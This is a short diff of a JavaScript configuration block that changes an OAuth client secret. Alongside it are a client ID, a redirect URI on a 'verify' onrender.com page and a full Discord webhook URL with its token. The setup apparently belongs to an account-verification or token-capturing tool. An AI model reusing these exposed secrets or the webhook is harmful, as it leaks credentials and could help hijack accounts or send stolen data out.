@@ -1,5 +1,5 @@
 // Configuration
-const client_secret = 'Kfe8Q~xXblqOzOorA0vhHlkYK2fv7PiGMsp-Ob0k'
+const client_secret = 'd86e4e39-0166-4852-a3e3-fa0f71600649'
 const client_id = '62d2cbbb-cc7c-4ac8-b5e1-caafe1d57145'
 const redirect_uri = 'https://verify-1d23.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1050517720589930627/fobrmoR9KbVBzkQMFPnxTvGbSlOLSVAuDjdTLF-olNZFmP_KItyOM_oazHHC_0zOT6ZK'
